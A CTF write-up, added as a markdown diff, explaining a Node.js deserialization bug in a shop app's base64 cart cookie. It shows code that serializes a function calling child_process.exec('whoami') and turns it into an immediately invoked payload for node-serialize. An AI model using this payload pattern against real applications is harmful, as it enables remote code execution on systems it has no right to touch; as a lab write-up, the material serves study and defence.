@@ -1,0 +1,40 @@
+## Seriously by sAINT_barber
+
+Descrpition: 
+
+<img src="images/image17.png" width="450">
+
+I did not solve this challenge during the CTF, but i didnt find a good enough writeup explaing the vulnerability.
+
+Im guessing from the many instances of the challenge there should be some sort of RCE, and guessing the word Seriously sounds a little like Serialize? But anyway on to the solution.
+
+After viewing the site and intercepting some requests i noticed the response header: `X-Powered-By: Express` so the application is running nodejs. And once we add something to our cart it creates a cookie containing the items in the cart : `eyJpdGVtcyI6eyIwIjp7Im5hbWUiOiJEcmFjYWVuYSB0cmlmYXNjaWF0YSIsInByaWNlIjoxNC45OSwiY291bnQiOjF9fX0%3D`
+
+Once decoded: `{"items":{"0":{"name":"Dracaena trifasciata","price":14.99,"count":1}}}`
+
+I googled a bit about node js deserialization and found this website explaining the exploit perfectly: `https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/`
+
+Like many deserialization exploits on various languages (PHP, Python) we need to craft some code to be executed when provoked after going through the unserialize() function.
+
+Create a small node js script to serialize an object with key `rce` and value a function that executes `whoami`:
+
+```
+var y = {rce : function(){require('child_process').exec('whoami', function(error, stdout, stderr) { console.log(stdout) });},}
+var serialize = require('node-serialize');
+console.log("Serialized: \n" + serialize.serialize(y));
+```
+Running the script prints the serialized payload:
+
+<img src="images/image18.png" width="650">
+
+To execute the function immediately we can add an open close bracket an the end of our function. This is called  Immediately invoked function expression (IIFE):
+
+```
+var y = {rce : function(){require('child_process').exec('whoami', function(error, stdout, stderr) { console.log(stdout) });}<b>()</b>,}
+var serialize = require('node-serialize');
+console.log("Serialized: \n" + serialize.serialize(y));
+```
+
+Running this will Immediately invoked our function executing whoami:
+
+<img src="images/image19.png" width="650">
